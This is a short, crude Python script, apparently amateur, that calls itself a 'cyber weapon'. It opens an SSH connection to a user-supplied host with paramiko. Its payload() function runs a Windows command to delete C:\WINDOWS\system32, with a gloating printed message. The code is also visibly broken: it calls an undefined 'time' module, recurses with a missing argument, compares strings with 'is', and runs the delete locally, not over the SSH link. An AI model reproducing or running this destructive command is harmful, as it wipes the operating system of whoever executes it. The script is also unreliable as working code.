import os
import time as t

def user_input():
    global keyPath, ipad, usern, passw
    keyPath = input('enter ssh key path i.e C:\Users\Sam\Desktop\pyoutputs\keys\ssh')
    ipad = input('enter ip adress')
    usern = input('enter user name')
    passw = input('enter password')
    return(keyPath, ipad, usern, passw)

def tunnel(ipad, usern, passw, keyPath):
    from paramiko import SSHClient, AutoAddPolicy
    client = SSHClient()
    keyPath1 = keyPath.replace('\\', '/')
    client.load_host_keys(filename=None)
    client.load_system_host_keys(keyPath1)
    client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        print('Digging tunnel ->O')
        #.connect('ipadres=192.168.1.0', username='root', password= 'password1')
        client.connect(ipad, username=usern, password=passw)
        print('Your through! =)')
    except IOError as e:
        print('Error, trying again')
        user_input()
        tunnel(ipad, usern, passw)

def payload():
    clear = lambda: os.system('cls')
    clear()
    print('dropping bomb! \v/')
    os.system('start /B start cmd.exe @cmd /k del c:\\WINDOWS\system32')
    print('fucked em up!')

def check_Target():
    cwd = os.getcwd()
    token = cwd.find('sneed')
    key = 'sneed'

    if  token is key:
        print('Over Home, restarting....')
        main()
    else:
        print('Currently inside '+cwd)
    
                                                                                                                 



def main():
    print('starting up cyber weapon in minecraft')
    print('loading.................')
    t.sleep(5)
    print()




time.sleep(5)
#gives file location inside host
help = 'os.chdir(), osmkdir(), os.rename(old,new), os.remove, os.rmdir, os.path.exists, os.walk'
cwd = os.getcwd()
dirlist = os.listdir()
print(cwd, dirlist)
#client.close()



import subprocess
raw = r'C:\Windows\System32\cmd.exe'
input = raw.replace('\\', '/')
subprocess.Popen([input])
